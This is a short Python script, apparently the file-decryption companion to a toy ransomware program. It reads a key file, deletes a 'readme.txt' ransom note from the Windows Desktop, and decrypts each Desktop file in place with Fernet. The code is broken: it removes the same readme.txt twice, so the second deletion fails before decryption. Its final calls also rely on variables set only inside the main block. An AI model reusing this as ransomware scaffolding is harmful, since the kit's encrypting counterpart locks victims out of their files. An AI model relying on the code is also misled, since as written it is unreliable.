from cryptography.fernet import Fernet
import os

def retornarKey():
    return open("key.key","rb").read()

def decryp(items, key):
    i = Fernet(key)
    for x in items:
        with open(x,"rb") as file:
            file_data = file.read()
        data = i.decrypt(file_data)

        with open(x,"wb") as file:
            file.write(data)

if __name__ == "__main__":
    user_profile = os.getenv('USERPROFILE')
    archivos = os.path.join(user_profile, 'Desktop')
    os.remove(archivos+"\\"+"readme.txt")
    items = os.listdir(archivos)
    archivos_2 = [os.path.join(archivos, x) for x in items]

    archivos_3 = os.path.join(user_profile, 'Desktop')
    os.remove(archivos_3+"\\"+"readme.txt")
    items = os.listdir(archivos_3)
    archivos_4 = [os.path.join(archivos_3, x) for x in items]

key = retornarKey()
decryp(archivos_2,key)
decryp(archivos_4,key)